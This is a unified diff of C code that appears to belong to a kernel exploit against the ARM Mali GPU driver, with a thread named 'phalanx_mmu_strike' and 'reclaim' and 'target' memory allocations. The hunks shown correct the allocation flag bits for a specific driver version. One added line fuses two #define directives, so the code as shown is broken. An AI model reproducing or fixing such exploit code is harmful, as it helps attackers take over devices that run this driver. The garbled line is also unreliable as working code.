@@ -43,10 +43,16 @@ typedef int32_t  s32;
 
 #define BASE_KCPU_COMMAND_TYPE_FENCE_SIGNAL  3
 #define BASE_KCPU_COMMAND_TYPE_CQS_WAIT      4
-#define BASE_MEM_SAME_VA                     0x1
+#define BASE_MEM_PROT_CPU_RD  (1u << 0)  /* 0x1 */
+#define BASE_MEM_PROT_CPU_WR  (1u << 1)  /* 0x2 */
+#define BASE_MEM_PROT_GPU_RD  (1u << 2)  /* 0x4 */
+#define BASE_MEM_PROT_GPU_WR  (1u << 3)  /* 0x8 */
+#define BASE_MEM_SAME_VA      (1u << 13) /* 0x2000 */
+
+#define MEM_ALLOC_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
+                         BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)  /* 0xF */
 #define KBASE_REG_GPU_WR                     (1ul << 19)
-#define KBASE_REG_GPU_RD                     (1ul << 20)
-#define KBASE_MEM_PROT_CPU_RD                (1ul << 57)
+#define KBASE_REG_GPU_RD                     (1ul << 20)#define KBASE_MEM_PROT_CPU_RD                (1ul << 57)
 
 struct kbase_ioctl_version_check { u16 major; u16 minor; };
 struct kbase_ioctl_set_flags { u32 create_flags; };
@@ -131,7 +137,7 @@ void* phalanx_mmu_strike(void* arg) {
         union kbase_ioctl_mem_alloc reclaim_req = {0};
         reclaim_req.in.va_pages = 1;
         reclaim_req.in.commit_pages = 1;
-        reclaim_req.in.flags = 0x0F | BASE_MEM_SAME_VA | KBASE_REG_GPU_RD | KBASE_REG_GPU_WR;
+        reclaim_req.in.flags = MEM_ALLOC_FLAGS;
         reclaim_req.in.extension = 0;  /* MUST be 0 for r54p0! */
         
         int ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &reclaim_req);
@@ -212,7 +218,7 @@ int main(int argc, char **argv) {
     union kbase_ioctl_mem_alloc alloc_target = {0};
     alloc_target.in.va_pages = 1;
     alloc_target.in.commit_pages = 1;
-    alloc_target.in.flags = 0x0F;
+    alloc_target.in.flags = MEM_ALLOC_FLAGS;
     alloc_target.in.extension = 0;  /* CRITICAL: Must be 0 for r54p0! */
     ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
     if (ret < 0) {
@@ -221,7 +227,7 @@ int main(int argc, char **argv) {
         memset(&alloc_target, 0, sizeof(alloc_target));
         alloc_target.in.va_pages = 1;
         alloc_target.in.commit_pages = 1;
-        alloc_target.in.flags = BASE_MEM_SAME_VA;
+        alloc_target.in.flags = MEM_ALLOC_FLAGS | BASE_MEM_SAME_VA;
         alloc_target.in.extension = 0;
         ret = ioctl(mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc_target);
         if (ret < 0) {
